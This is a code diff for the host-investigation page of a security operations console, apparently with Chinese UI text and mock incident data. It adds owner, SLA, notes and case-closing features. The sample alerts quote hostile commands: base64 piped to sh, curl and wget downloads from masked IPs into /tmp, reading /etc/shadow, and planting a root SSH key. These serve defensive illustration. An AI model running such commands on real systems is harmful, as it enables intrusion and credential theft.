@@ -1230,6 +1230,27 @@
 .kc-ic.i-hunt{--m:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M13 1L13.001 4.06201C16.6192 4.51365 19.4869 7.38163 19.9381 11L23 11V13L19.938 13.001C19.4864 16.6189 16.6189 19.4864 13.001 19.938L13 23H11L11 19.9381C7.38163 19.4869 4.51365 16.6192 4.06201 13.001L1 13V11L4.06189 11C4.51312 7.38129 7.38129 4.51312 11 4.06189L11 1H13ZM12 10C10.8954 10 10 10.8954 10 12C10 13.1046 10.8954 14 12 14C13.1046 14 14 13.1046 14 12C14 10.8954 13.1046 10 12 10Z"/%3E%3C/svg%3E')}
 .kc-ic.i-robot{--m:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M13.5 2C13.5 2.44425 13.3069 2.84339 13 3.11805V5H18C19.6569 5 21 6.34315 21 8V18C21 19.6569 19.6569 21 18 21H6C4.34315 21 3 19.6569 3 18V8C3 6.34315 4.34315 5 6 5H11V3.11805C10.6931 2.84339 10.5 2.44425 10.5 2C10.5 1.17157 11.1716 0.5 12 0.5C12.8284 0.5 13.5 1.17157 13.5 2ZM0 10H2V16H0V10ZM24 10H22V16H24V10ZM9 14.5C9.82843 14.5 10.5 13.8284 10.5 13C10.5 12.1716 9.82843 11.5 9 11.5C8.17157 11.5 7.5 12.1716 7.5 13C7.5 13.8284 8.17157 14.5 9 14.5ZM16.5 13C16.5 12.1716 15.8284 11.5 15 11.5C14.1716 11.5 13.5 12.1716 13.5 13C13.5 13.8284 14.1716 14.5 15 14.5C15.8284 14.5 16.5 13.8284 16.5 13Z"/%3E%3C/svg%3E')}
 .kc-ic.i-policy{--m:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M21 10H11V17.3823C11 18.9449 11.7775 20.4053 13.074 21.2742L14.1569 22H3.9934C3.44495 22 3 21.556 3 21.0082V2.9918C3 2.45531 3.44694 2 3.99826 2H15.9968L21 7V10ZM13 12H21V17.3823C21 18.2786 20.5544 19.1156 19.8125 19.6128L17 21.4978L14.1875 19.6128C13.4456 19.1156 13 18.2786 13 17.3823V12Z"/%3E%3C/svg%3E')}
+.sl .hu-rec{align-items:flex-start}
+.sl .hu-rec span{white-space:normal}
+.sl .hu-rec .hu-rd{margin-top:6px}
+.sl .hu-rd.r{background:#f53f3f}
+.sl .hu-rw{display:block;margin-top:2px;font-size:12px;line-height:18px;color:#86909c}
+.sl .hu-rw.r{color:#cb2634}
+.sl .hu-rr{flex:none;font-size:12px;color:#1664ff;text-decoration:none}
+.sl .hu-sla{color:#86909c}
+.sl .hu-sla.r{color:#cb2634}
+.sl .hu-cl{margin:0 0 12px;font-size:12px;line-height:20px;color:#42464e}
+.sl .hu-ia{align-items:center}
+.sl .hu-ownb.no{color:#cb2634}
+.sl .hu-slaal{margin:12px 0 0}
+.sl .hu-nt{padding:8px 0;border-bottom:1px solid #f2f3f5;font-size:12px}
+.sl .hu-nt div{display:flex;gap:8px;align-items:baseline}
+.sl .hu-nt b{font-weight:500;color:#0c0d0e}
+.sl .hu-nt time{color:#86909c}
+.sl .hu-nt p{margin:4px 0 0;color:#42464e;line-height:20px}
+.sl .hu-nti{display:flex;gap:8px;align-items:flex-end;margin-top:10px}
+.sl .hu-nti textarea{height:56px}
+.sl .hu-hint a{margin-left:4px;color:#1664ff;text-decoration:none}
 </style>
 </helmet>
 <div class="kc ux-wrap">
@@ -1360,8 +1381,9 @@
         <sc-if value="{{ls.qOff}}" hint-placeholder-val="{{false}}"><div class="kc-card hu-qo"><button type="button" class="hu-ib" aria-label="展开调查队列" title="展开调查队列" onClick="{{ls.qT}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></button><button type="button" class="hu-qv" onClick="{{ls.qT}}"><span>调查队列</span></button><div class="hu-qhs"><sc-for list="{{ls.railH}}" as="h" hint-placeholder-count="3"><button type="button" class="{{h.c}}" title="{{h.tt}}" onClick="{{h.t}}">{{h.k}}</button></sc-for></div></div></sc-if>
         <section class="kc-card hu-c">
           <div class="hu-ih"><div class="hu-im"><small class="hu-id">{{ls.inc.id}} · 主机调查</small><div class="hu-tt"><h2>{{ls.inc.n}}</h2><span class="{{ls.inc.lvC}}">{{ls.inc.lv}}</span><span class="{{ls.inc.stC}}">{{ls.inc.st}}</span></div>
-            <div class="hu-meta"><span>入口：{{ls.inc.entry}}</span><a href="#" onClick="{{ls.inc.hostGo}}">主机：{{ls.inc.host}} · {{ls.inc.ip}}</a><span>{{ls.inc.first}} — {{ls.inc.last}}</span></div></div>
-            <div class="hu-ia"><button type="button" class="kc-btn pri" onClick="{{ls.planO}}">处置方案</button><sc-if value="{{ls.inc.pend}}" hint-placeholder-val="{{true}}"><span class="hu-pend">{{ls.inc.pend}} 条待处理</span></sc-if></div></div>
+            <div class="hu-meta"><span>入口：{{ls.inc.entry}}</span><a href="#" onClick="{{ls.inc.hostGo}}">主机：{{ls.inc.host}} · {{ls.inc.ip}}</a><span>{{ls.inc.first}} — {{ls.inc.last}}</span><sc-if value="{{ls.inc.sla}}" hint-placeholder-val="{{true}}"><span class="{{ls.inc.slaC}}">{{ls.inc.sla}}</span></sc-if></div></div>
+            <div class="hu-ia"><span class="{{ls.ownW}}"><button type="button" class="{{ls.ownC}}" aria-haspopup="listbox" aria-expanded="{{ls.ownOn}}" onClick="{{ls.ownT}}">负责人：{{ls.ownN}}</button><sc-if value="{{ls.ownOn}}" hint-placeholder-val="{{false}}"><div class="dd-m" onClick="{{ls.ownX}}"></div><div class="dd-p" role="listbox" aria-label="负责人"><sc-for list="{{ls.owns}}" as="o" hint-placeholder-count="4"><button type="button" role="option" class="{{o.c}}" onClick="{{o.t}}">{{o.n}}</button></sc-for></div></sc-if></span><button type="button" class="kc-btn pri" onClick="{{ls.planO}}">处置方案</button><sc-if value="{{ls.inc.pend}}" hint-placeholder-val="{{true}}"><span class="hu-pend">{{ls.inc.pend}} 条待研判</span></sc-if></div></div>
+          <sc-if value="{{ls.inc.slaAl}}" hint-placeholder-val="{{false}}"><div class="ac-al e hu-slaal"><i>!</i><span>{{ls.inc.slaAlT}}</span></div></sc-if>
           <div class="hu-ai2"><i class="hu-av" aria-hidden="true"></i><div class="hu-aw"><div class="hu-al"><b>AI 研判</b><time>{{ls.ai.t}}</time></div>
             <div class="hu-bub"><div class="hu-aiv"><span class="{{ls.ai.vc}}">{{ls.ai.v}}</span><span class="kc-tag mut">{{ls.ai.confT}}</span></div><p class="hu-as">{{ls.ai.s}}</p>
               <sc-if value="{{ls.aiMore}}" hint-placeholder-val="{{false}}"><div class="hu-rs"><button type="button" class="hu-rsh" aria-expanded="{{ls.arE}}" onClick="{{ls.arT}}"><i class="hu-okc" aria-hidden="true"></i><span>研判推理完成 · 基于 {{ls.ai.n}} 条告警</span><i class="{{ls.arC}}" aria-hidden="true"></i></button>
@@ -1373,7 +1395,7 @@
                 <p class="hu-asg">处置建议：{{ls.plan.ai}}可在<a href="#" onClick="{{ls.planO}}">「处置方案」</a>中执行。</p></sc-if>
               <a href="#" class="hu-aim" onClick="{{ls.aiT}}">{{ls.aiTN}}<i class="{{ls.aiC}}" aria-hidden="true"></i></a></div></div></div>
           <div class="kc-tabs hu-tabs" role="tablist"><sc-for list="{{ls.vtabs}}" as="t" hint-placeholder-count="2"><button class="{{t.cls}}" type="button" role="tab" aria-selected="{{t.on}}" onClick="{{t.pick}}">{{t.n}}</button></sc-for><span class="hu-tip">{{ls.tip}}</span></div>
-          <sc-if value="{{ls.vChain}}" hint-placeholder-val="{{true}}"><div class="hu-cv"><div class="hu-lg"><span><i class="hu-ld r"></i>待处理告警</span><span><i class="hu-ld b"></i>已处理告警</span><span><i class="hu-ld n"></i>普通证据</span></div>
+          <sc-if value="{{ls.vChain}}" hint-placeholder-val="{{true}}"><div class="hu-cv"><div class="hu-lg"><span><i class="hu-ld r"></i>待研判告警</span><span><i class="hu-ld b"></i>已确认告警</span><span><i class="hu-ld n"></i>普通证据</span></div>
             <div class="hu-ch"><sc-for list="{{ls.chain}}" as="n" hint-placeholder-count="8"><sc-if value="{{n.arrow}}" hint-placeholder-val="{{true}}"><i class="{{n.ac}}" aria-hidden="true"></i></sc-if><button type="button" class="{{n.c}}" onClick="{{n.t}}" onMouseEnter="{{n.he}}" onMouseLeave="{{ls.hx}}"><span class="{{n.ic}}"><sc-if value="{{n.b}}" hint-placeholder-val="{{false}}"><em>{{n.b}}</em></sc-if></span><b>{{n.n}}</b><small>{{n.s}}</small></button></sc-for></div>
             <sc-if value="{{ls.brOn}}" hint-placeholder-val="{{false}}"><div class="hu-br"><span class="hu-brl">{{ls.brL}}</span><sc-for list="{{ls.br}}" as="n" hint-placeholder-count="2"><button type="button" class="{{n.c}}" onClick="{{n.t}}" onMouseEnter="{{n.he}}" onMouseLeave="{{ls.hx}}"><span class="{{n.ic}}"><sc-if value="{{n.b}}" hint-placeholder-val="{{false}}"><em>{{n.b}}</em></sc-if></span><b>{{n.n}}</b><small>{{n.s}}</small></button></sc-for></div></sc-if></div></sc-if>
           <sc-if value="{{ls.vTree}}" hint-placeholder-val="{{false}}"><div class="hu-tr"><p class="hu-trn">{{ls.trN}}</p><sc-for list="{{ls.tree}}" as="r" hint-placeholder-count="6"><button type="button" class="{{r.c}}" style="{{r.st}}" onClick="{{r.t}}"><i class="hu-ni proc sm" aria-hidden="true"></i><b>{{r.n}}</b><small>PID {{r.pid}}</small><code>{{r.cmd}}</code><sc-if value="{{r.al}}" hint-placeholder-val="{{false}}"><span class="{{r.alC}}">{{r.al}}</span></sc-if></button></sc-for></div></sc-if>
@@ -1389,7 +1411,7 @@
             <sc-if value="{{ls.nd.canPi}}" hint-placeholder-val="{{false}}"><a href="#" class="hu-pi" onClick="{{ls.nd.piGo}}">在主机详情中查看进程调查<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></a></sc-if>
             <div class="hu-sec"><div class="hu-st"><b>关键证据</b><span>{{ls.keyN}}</span></div><sc-for list="{{ls.keys}}" as="k" hint-placeholder-count="1"><div class="hu-ev"><div><b>{{k.n}}</b><time>{{k.tm}}</time></div><code>{{k.d}}</code></div></sc-for><sc-if value="{{ls.keyNone}}" hint-placeholder-val="{{false}}"><p class="hu-none">这个节点没有直接告警，是攻击链上的关联证据</p></sc-if></div>
             <div class="hu-sec"><div class="hu-st"><b>关联告警</b><span>{{ls.relN}}</span><sc-if value="{{ls.relMoreOn}}" hint-placeholder-val="{{true}}"><a href="#" onClick="{{ls.relAll}}">{{ls.relAllN}}</a></sc-if></div><sc-for list="{{ls.rel}}" as="r" hint-placeholder-count="3"><button type="button" class="{{r.c}}" onClick="{{r.t}}" onMouseEnter="{{r.he}}" onMouseLeave="{{ls.hx}}"><b>{{r.n}}</b><small>{{r.stg}} · {{r.st}}</small></button></sc-for></div></div>
-          <div class="hu-rf"><div class="hu-st"><b>处置记录</b></div><sc-for list="{{ls.recs}}" as="r" hint-placeholder-count="1"><div class="hu-rec"><i class="{{r.c}}"></i><span>{{r.n}}</span><time>{{r.tm}}</time></div></sc-for><sc-if value="{{ls.recNone}}" hint-placeholder-val="{{true}}"><p class="hu-none">还没有发起处置</p></sc-if>
+          <div class="hu-rf"><div class="hu-st"><b>处置记录</b></div><sc-for list="{{ls.recs}}" as="r" hint-placeholder-count="1"><div class="hu-rec"><i class="{{r.c}}"></i><span>{{r.n}}<sc-if value="{{r.hasWhy}}" hint-placeholder-val="{{false}}"><small class="{{r.wc}}">{{r.why}}</small></sc-if></span><time>{{r.tm}}</time><sc-if value="{{r.re}}" hint-placeholder-val="{{false}}"><a href="#" class="hu-rr" onClick="{{r.reGo}}">{{r.reN}}</a></sc-if></div></sc-for><sc-if value="{{ls.recNone}}" hint-placeholder-val="{{true}}"><p class="hu-none">还没有发起处置</p></sc-if>
             <button type="button" class="kc-btn pri hu-pb" onClick="{{ls.planO}}">查看处置方案<sc-if value="{{ls.planN}}" hint-placeholder-val="{{true}}"><em class="hu-bn">{{ls.planN}}</em></sc-if></button></div></section>
       </div>
       <sc-if value="{{ls.planOn}}" hint-placeholder-val="{{false}}"><div class="sh-mask sh-fx" onClick="{{ls.planX}}"></div><aside class="sh-dw sh-fx hu-dw" role="dialog" aria-modal="true" aria-label="处置方案"><header><div class="hu-dwt"><h3>处置方案</h3><small>{{ls.inc.id}} · {{ls.inc.n}}</small></div><button type="button" class="sh-x" aria-label="关闭" onClick="{{ls.planX}}">×</button></header>
@@ -1397,7 +1419,12 @@
           <div class="hu-ps"><div class="hu-pst"><b>研判结论</b><sc-if value="{{ls.vdNeed}}" hint-placeholder-val="{{true}}"><span class="hd-o">执行前需要确认</span></sc-if></div><div class="hu-vd" role="radiogroup" aria-label="研判结论"><sc-for list="{{ls.vds}}" as="v" hint-placeholder-count="2"><button type="button" class="{{v.c}}" role="radio" aria-checked="{{v.a}}" onClick="{{v.t}}"><i></i><span><b>{{v.n}}</b><small>{{v.d}}</small></span></button></sc-for></div></div>
           <sc-if value="{{ls.itemsOn}}" hint-placeholder-val="{{true}}"><div class="hu-ps"><div class="hu-pst"><b>处置清单</b><span>已选 {{ls.selN}} 项</span></div><sc-for list="{{ls.items}}" as="x" hint-placeholder-count="5"><button type="button" class="{{x.c}}" role="checkbox" aria-checked="{{x.a}}" onClick="{{x.t}}"><i><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M10 15.17l9.19-9.19 1.42 1.42L10 18 3.64 11.64l1.42-1.42z"></path></svg></i><span class="hu-pix"><b>{{x.n}}</b><code>{{x.tg}}</code><sc-if value="{{x.w}}" hint-placeholder-val="{{false}}"><em>{{x.w}}</em></sc-if></span><sc-if value="{{x.added}}" hint-placeholder-val="{{false}}"><small class="hu-add">从节点操作加入</small></sc-if><sc-if value="{{x.done}}" hint-placeholder-val="{{false}}"><small class="hu-dn">{{x.done}}</small></sc-if></button></sc-for>
             <p class="hu-hint">要处置其他节点？在攻击链里选中节点，从「节点操作」加入清单</p></div></sc-if>
-          <div class="hu-ps"><div class="hu-pst"><b>处置记录</b></div><sc-for list="{{ls.recs}}" as="r" hint-placeholder-count="1"><div class="hu-rec"><i class="{{r.c}}"></i><span>{{r.n}}</span><time>{{r.tm}}</time></div></sc-for><sc-if value="{{ls.recNone}}" hint-placeholder-val="{{true}}"><p class="hu-none">还没有发起处置</p></sc-if></div></div>
+<sc-if value="{{ls.roOn}}" hint-placeholder-val="{{false}}"><div class="hu-ps"><div class="hu-pst"><b>重新打开</b><span>同一事件继续调查，原处置记录保留</span></div><div class="sh-rad" role="radiogroup" aria-label="重新打开原因"><sc-for list="{{ls.ros}}" as="o" hint-placeholder-count="3"><button type="button" class="{{o.c}}" role="radio" aria-checked="{{o.a}}" onClick="{{o.t}}"><i></i>{{o.n}}</button></sc-for></div></div></sc-if>
+          <div class="hu-ps"><div class="hu-pst"><b>调查备注</b></div><sc-for list="{{ls.nts}}" as="n" hint-placeholder-count="1"><div class="hu-nt"><div><b>{{n.who}}</b><time>{{n.tm}}</time></div><p>{{n.t}}</p></div></sc-for><sc-if value="{{ls.ntNone}}" hint-placeholder-val="{{false}}"><p class="hu-none">还没有备注</p></sc-if><div class="hu-nti"><textarea aria-label="添加备注" placeholder="记录调查发现、和业务方的沟通结果" value="{{ls.ntV}}" onChange="{{ls.ntOn}}"></textarea><button type="button" class="kc-btn" onClick="{{ls.ntAdd}}">添加</button></div></div>
+          <sc-if value="{{ls.clOn}}" hint-placeholder-val="{{false}}"><div class="hu-ps"><div class="hu-pst"><b>结案</b><span>{{ls.clS}}</span></div><p class="hu-cl">复检：{{ls.clChk}}</p>
+            <div class="hu-pst"><b>根因</b><sc-if value="{{ls.clNeed}}" hint-placeholder-val="{{true}}"><span class="hd-o">结案前必选</span></sc-if></div><div class="hu-vd" role="radiogroup" aria-label="根因"><sc-for list="{{ls.roots}}" as="v" hint-placeholder-count="4"><button type="button" class="{{v.c}}" role="radio" aria-checked="{{v.a}}" onClick="{{v.t}}"><i></i><span><b>{{v.n}}</b><small>{{v.d}}</small></span></button></sc-for></div>
+            <p class="hu-hint">{{ls.clTip}}<sc-if value="{{ls.clVul}}" hint-placeholder-val="{{false}}"><a href="#" onClick="{{ls.clVulGo}}">{{ls.clVulN}}</a></sc-if></p></div></sc-if>
+          <div class="hu-ps"><div class="hu-pst"><b>处置记录</b></div><sc-for list="{{ls.recs}}" as="r" hint-placeholder-count="1"><div class="hu-rec"><i class="{{r.c}}"></i><span>{{r.n}}<sc-if value="{{r.hasWhy}}" hint-placeholder-val="{{false}}"><small class="{{r.wc}}">{{r.why}}</small></sc-if></span><time>{{r.tm}}</time><sc-if value="{{r.re}}" hint-placeholder-val="{{false}}"><a href="#" class="hu-rr" onClick="{{r.reGo}}">{{r.reN}}</a></sc-if></div></sc-for><sc-if value="{{ls.recNone}}" hint-placeholder-val="{{true}}"><p class="hu-none">还没有发起处置</p></sc-if></div></div>
         <footer><button type="button" class="kc-btn" onClick="{{ls.planX}}">关闭</button><button type="button" class="{{ls.exC}}" aria-disabled="{{ls.exDis}}" onClick="{{ls.exGo}}">{{ls.exN}}</button></footer></aside></sc-if>
       <sc-if value="{{ls.tsOn}}" hint-placeholder-val="{{false}}"><div class="sh-toast sh-fx" role="status"><i class="{{ls.toast.c}}"></i>{{ls.toast.t}}</div></sc-if>
     </main>
@@ -2284,12 +2311,12 @@ class Component extends DCLogic {
           ai: ['09:04', '高度可疑', '81%', 'kworkerd 不是内核线程，由 bash 派生后持续连接 185.66.21.9:443，3 分钟内上行 38.2MB。', ['进程名与内核线程相同，但可执行文件在 /tmp/.x 下', '外联地址命中 C2 情报', '和 INC-3201 是同一个进程，可以合并调查']],
           main: ['host', 'p3', 'p5', 'c2'], br: [], al: [['b1', '09:00:00', '异常外联', '命令控制', 'T1071 应用层协议', '与 185.66.21.9:443 建立长连接', 'p5'], ['b2', '09:03:40', '数据外传', '数据外传', 'T1041 通过 C2 通道外传', '上行 38.2MB，疑似打包 /var/www', 'p5']],
           plan: ['终止 kworkerd（4433）并封禁 185.66.21.9。这个事件和 INC-3201 来自同一条攻击链，建议一起处置。', [['终止进程', 'kworkerd · PID 4433', ''], ['封禁 IP', '185.66.21.9', ''], ['隔离落地文件', '/tmp/.x/kworkerd', '']]], recs: [] },
-        { id: 'INC-3198', n: 'SSH 暴力破解后登录', lv: '紧急', h: 'web-prod-01', st0: '已遏制', tm: '07:02', entry: 'SSH 暴力破解', first: '07:02:11', last: '07:06:02',
+        { id: 'INC-3198', n: 'SSH 暴力破解后登录', lv: '紧急', h: 'web-prod-01', st0: '待验证', tm: '07:02', entry: 'SSH 暴力破解', first: '07:02:11', last: '07:06:02',
           ai: ['07:07', '确认入侵', '95%', '61.177.**.20 爆破 312 次后以 deploy 登录成功，随后读取 /etc/shadow 并写入 root 的 SSH 公钥。', ['登录前 10 分钟内同一来源失败 312 次', '登录后 4 分钟内读取凭据并写入公钥，属于典型的持久化手法']],
           main: ['s2', 'p7', 'p8', 'p9'], br: ['p10', 'p11'], brAt: 'p9',
           al: [['c1', '07:02:11', 'SSH 登录成功', '初始访问', 'T1110 暴力破解', 'deploy 从 61.177.**.20 登录（此前 312 次失败）', 'p8'], ['c2', '07:05:40', '读取敏感文件', '凭据访问', 'T1003.008 /etc/shadow', 'cat /etc/shadow', 'p10'], ['c3', '07:06:02', '写入 SSH 公钥', '持久化', 'T1098.004 SSH 公钥', 'tee -a /root/.ssh/authorized_keys', 'p11']],
           plan: ['已封禁来源 IP 并清除新增公钥。建议重置 deploy 密码，并开启二次身份认证。', [['封禁 IP', '61.177.**.20', ''], ['删除新增公钥', '/root/.ssh/authorized_keys 第 3 行', ''], ['重置账号密码', 'deploy', '']]],
-          recs: [['封禁 IP 61.177.**.20', '07:09'], ['删除新增公钥', '07:10'], ['重置 deploy 密码', '07:12']], done: 1 },
+          recs: [{ n: '封禁 IP', tg: '61.177.**.20', r: 'ok', tm: '07:09' }, { n: '删除新增公钥', tg: '/root/.ssh/authorized_keys 第 3 行', r: 'ok', tm: '07:10' }, { n: '重置账号密码', tg: 'deploy', r: 'ok', tm: '07:12' }], vdR: 1 },
         { id: 'INC-3205', n: '可疑编码命令执行', lv: '可疑', h: 'app-03', st0: '待研判', tm: '09:12', entry: '应用进程派生 Shell', first: '09:12:30', last: '09:12:31',
           ai: ['09:13', '需要人工确认', '64%', 'Java 应用进程派生 sh，执行了一段 base64 编码的命令，解码后是从 45.13.**.8 下载脚本。', ['应用进程派生 Shell 不常见，但部分运维脚本也会这么做', '下载地址命中中置信度情报']],
           main: ['host', 'j1', 'j2', 'j3', 'x2'], br: [], al: [['d1', '09:12:30', '编码命令执行', '执行', 'T1027 混淆命令', 'echo Y3Vyb…| base64 -d | sh', 'j2'], ['d2', '09:12:31', '下载脚本', '执行', 'T1105 入口工具传输', 'curl 45.13.**.8/x.sh', 'j3']],
@@ -2297,14 +2324,37 @@ class Component extends DCLogic {
         { id: 'INC-3190', n: 'SSH 暴力破解后登录', lv: '紧急', h: 'api-01', st0: '处置中', tm: '08:41', entry: 'SSH 暴力破解', first: '08:41:10', last: '08:43:00',
           ai: ['08:44', '确认入侵', '90%', '222.186.**.71 爆破成功后以 ops 登录，下载并准备执行 /tmp/k。', ['登录后立即下载并赋予执行权限']],
           main: ['s3', 'k1', 'k2'], br: [], al: [['e1', '08:41:10', 'SSH 登录成功', '初始访问', 'T1110 暴力破解', 'ops 从 222.186.**.71 登录', 'k1'], ['e2', '08:43:00', '下载可疑文件', '执行', 'T1105 入口工具传输', 'wget -q 222.186.**.71/k -O /tmp/k', 'k2']],
-          plan: ['封禁来源 IP，终止 bash（4021），删除 /tmp/k，并重置 ops 密码。', [['封禁 IP', '222.186.**.71', ''], ['终止进程', 'bash · PID 4021', ''], ['删除文件', '/tmp/k', '']]], recs: [['封禁 IP 222.186.**.71', '执行中']], run: 1 }];
+          plan: ['封禁来源 IP，终止 bash（4021），删除 /tmp/k，并重置 ops 密码。', [['封禁 IP', '222.186.**.71', ''], ['终止进程', 'bash · PID 4021', ''], ['删除文件', '/tmp/k', '']]], recs: [{ n: '封禁 IP', tg: '222.186.**.71', r: 'ok', tm: '08:46' }, { n: '终止进程', tg: 'bash · PID 4021', r: 'ok', tm: '08:46' }, { n: '删除文件', tg: '/tmp/k', r: 'fail', tm: '08:47', why: '文件正被进程 4188 占用，客户端已终止该进程，可以重试' }], vdR: 1 }];
+      /* hunt170 */
+      { let nw = null; try { nw = JSON.parse(localStorage.getItem('dxIncNew') || 'null'); } catch (y) {}
+        if (nw && nw.id === 'INC-3206' && !INC.some((x) => x.id === 'INC-3206')) {
+          OTHER.s6 = ['ip', '攻击源', '45.142.xx.xx', [['IP', '45.142.xx.xx'], ['归属', '境外 · 荷兰'], ['登录前', '1 小时内失败 312 次', 'hd-red']]];
+          PRC.m1 = ['sshd', 3920, 'p7', 'root', 'sshd: root [priv]', '已签名 · Debian', '0d9e…77a1']; PRC.m2 = ['bash', 3925, 'm1', 'root', '-bash', '已签名 · Debian', '6a4f…2be0']; PRC.m3 = ['sh', 3990, 'm2', 'root', 'sh /tmp/.x', '无签名', 'b72c…5e10'];
+          INC.unshift({ id: 'INC-3206', n: '异常登录后执行可疑文件', lv: '紧急', h: 'web-prod-01', st0: '待研判', tm: '10:12', entry: '由告警升级', first: '10:12:00', last: '10:12:40',
+            ai: ['10:13', '确认入侵', '88%', '45.142.xx.xx 在 1 小时内尝试登录 312 次后以 root 登录成功，随后执行了 /tmp/.x。', ['登录前同一来源失败 312 次', '登录后 40 秒内执行 /tmp 下的无签名文件']],
+            main: ['s6', 'host', 'm1', 'm2', 'm3'], br: [], al: [['g1', '10:12:00', '异常登录', '初始访问', 'T1078 有效账号', 'root 从 45.142.xx.xx 登录（此前失败 312 次）', 'm1'], ['g2', '10:12:40', '执行可疑文件', '执行', 'T1204 用户执行', 'sh /tmp/.x', 'm3']],
+            plan: ['封禁 45.142.xx.xx，终止 sh（3990）并隔离 /tmp/.x，然后重置 root 密码。', [['封禁 IP', '45.142.xx.xx', ''], ['终止进程树', 'sh · PID 3990', ''], ['隔离落地文件', '/tmp/.x', ''], ['重置账号密码', 'root', '会断开 root 当前的远程会话']]], recs: [] }); } }
       const IM = {}; INC.forEach((x) => { IM[x.id] = x; });
-      const run = st.huRun || {}; const vd0 = st.huVd || {};
-      const stOf = (x) => run[x.id] === 'done' ? (vd0[x.id] === 'fp' ? '已关闭 · 误报' : '已遏制') : run[x.id] === 'ing' ? '处置中' : x.done ? '已遏制' : x.run ? '处置中' : x.st0;
-      const STC = { '待研判': 'kc-tag warn', '处置中': 'kc-tag info', '已遏制': 'kc-tag ok', '已关闭 · 误报': 'kc-tag mut' };
+      const OWN0 = { 'INC-3198': '张敏', 'INC-3190': '张敏' }; const own = Object.assign({}, OWN0, st.huOwn || {});
+      const NOTE0 = { 'INC-3190': [['张敏', '08:50', 'ops 是离职员工遗留账号，已通知运维停用。']] }; const notes = Object.assign({}, NOTE0, st.huNt || {});
+      const run = st.huRun || {}; const vd0 = st.huVd || {}; const reT = st.huRe || {};
+      /* 事件状态：待研判 → 调查中 → 处置中 → 待验证 → 已关闭 */
+      const FAIL = { 'INC-3201': { '清除持久化': 'crontab 文件被加了不可修改属性（chattr +i），客户端无权修改。先执行 chattr -i 解除后重试' } };
+      /* hunt171 复检 / 重新打开 / 负责人 / 备注 / 状态回写告警 */
+      const chk = st.huChk || {}; const hist = st.huHist || {};
+      const RCF = { 'INC-3198': ['删除残留公钥', '/root/.ssh/authorized_keys 第 5 行', '复检发现 root 下还有一把未知公钥（第 5 行），攻击者仍能免密登录'] };
+      const recOf = (x) => (st.huRec || {})[x.id] || x.recs;
+      const RE = (x) => recOf(x).map((y) => { const rr = reT[x.id + '|' + y.n]; return rr === 'ok' && y.fix ? { n: y.fix[0], tg: y.fix[1], r: 'ok', tm: '刚刚', why: '复检未通过后补充处置' } : rr === 'ok' ? Object.assign({}, y, { r: 'ok', tm: '刚刚', why: '重试成功' }) : rr === 'ing' ? Object.assign({}, y, { r: 'ing', tm: '重试中' }) : y; });
+      const stOf = (x) => { const r = run[x.id]; if (r === 'closed') return vd0[x.id] === 'fp' ? '已关闭 · 误报' : '已关闭'; if (r === 'done' && vd0[x.id] === 'fp') return '已关闭 · 误报';
+        const L = RE(x); if (L.length) return L.some((y) => y.r === 'ing' || y.r === 'fail') ? '处置中' : '待验证';
+        return vd0[x.id] === 'real' ? '调查中' : x.st0; };
+      const STC = { '待研判': 'kc-tag warn', '调查中': 'kc-tag info', '处置中': 'kc-tag info', '待验证': 'kc-tag ok', '已关闭': 'kc-tag mut', '已关闭 · 误报': 'kc-tag mut' };
+      const SLA = { 'INC-3201': ['响应', '已超时 12 分钟', 1], 'INC-3202': ['响应', '剩 18 分钟'], 'INC-3205': ['响应', '剩 2 小时 18 分'], 'INC-3190': ['处置', '剩 41 分钟'], 'INC-3206': ['响应', '剩 28 分钟'] };
+      const slaOf = (x) => { const s = stOf(x); if (s === '待验证' || s.indexOf('已关闭') === 0) return null; const v = SLA[x.id]; if (!v) return null; return s !== '待研判' && v[0] === '响应' ? ['处置', '剩 3 小时 52 分'] : v; };
+      { const m = {}; INC.forEach((x) => { m[x.id] = stOf(x); }); const js = JSON.stringify(m); if (js !== this.__isJs) { this.__isJs = js; try { localStorage.setItem('dxIncSt', js); } catch (y) {} } }
       const incId = IM[st.huI] ? st.huI : IM[nf['事件']] ? nf['事件'] : 'INC-3201';
       const inc = IM[incId]; const hn = inc.h; const hh = HM[hn] || {};
-      const handled = (x) => stOf(x) !== '待研判';
+      const handled = (x) => { const s = stOf(x); return s !== '待研判' && s !== '调查中'; };
       const pendN = INC.filter((x) => stOf(x) === '待研判').length;
       ls.sum = INC.length + ' 个事件 · ' + pendN + ' 个待研判';
       { const HL = HS.map((h) => ({ n: h.n, ip: h.ip, bad: h.ps === '未受保护' }));
@@ -2355,13 +2405,17 @@ class Component extends DCLogic {
       ls.groups = hosts.map((h2) => { const its = vis.filter((x) => x.h === h2); const open = gk[h2] === undefined ? true : gk[h2]; const H2 = HM[h2] || {}; const cur = its.find((x) => x.id === incId) || its[0];
         return { ip: H2.ip || '', n: h2, cnt: its.filter((x) => stOf(x) === '待研判').length || '', open, ex: open ? 'true' : 'false', chev: open ? 'hu-cv1 up' : 'hu-cv1', dot: H2.on === '离线' ? 'hu-od x' : 'hu-od', c: 'hu-g' + (its.some((x) => x.id === incId) ? ' cur' : ''),
           t: ev(() => S({ huG: Object.assign({}, gk, { [h2]: !open }) })), go: (e) => piGo(cur, cur.id === incId && PRC[selRef.v] ? selRef.v : firstProc(cur))(e),
-          items: its.map((x) => { const s2 = stOf(x); return { n: x.n, st: s2, sub: x.id + ' · ' + s2, sc: s2 === '待研判' ? 'hd-red' : 'hd-mut', tm: x.tm, c: 'hu-it ' + LB[x.lv] + (x.id === incId ? ' on' : ''), t: ev(() => S({ huI: x.id, huN: '', huX: 0, huNo: false, huAll: 0, huH: '' })) }; }) }; });
